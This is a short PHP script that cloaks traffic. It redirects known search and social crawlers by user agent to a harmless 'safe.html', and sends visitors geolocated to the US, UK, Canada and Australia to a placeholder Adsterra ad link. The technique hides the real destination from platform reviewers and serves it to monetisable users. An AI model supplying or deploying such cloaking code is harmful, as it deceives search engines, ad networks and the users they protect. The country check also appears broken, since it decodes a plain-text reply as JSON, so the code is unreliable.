<?php
$user_agent = $_SERVER['HTTP_USER_AGENT'];
$bots = ['Googlebot', 'Bingbot', 'Slurp', 'DuckDuckBot', 'YandexBot', 'facebookexternalhit'];

foreach ($bots as $bot) {
  if (stripos($user_agent, $bot) !== false) {
    header("Location: safe.html");
    exit;
  }
}

// IP Geolocation
$ip = $_SERVER['REMOTE_ADDR'];
$country = json_decode(file_get_contents("https://ipapi.co/{$ip}/country/"), true);

$tier1 = ['US', 'GB', 'CA', 'AU'];

if (in_array($country, $tier1)) {
  header("Location: https://your-adsterra-direct-link.com");
} else {
  header("Location: safe.html");
}
exit;
?>
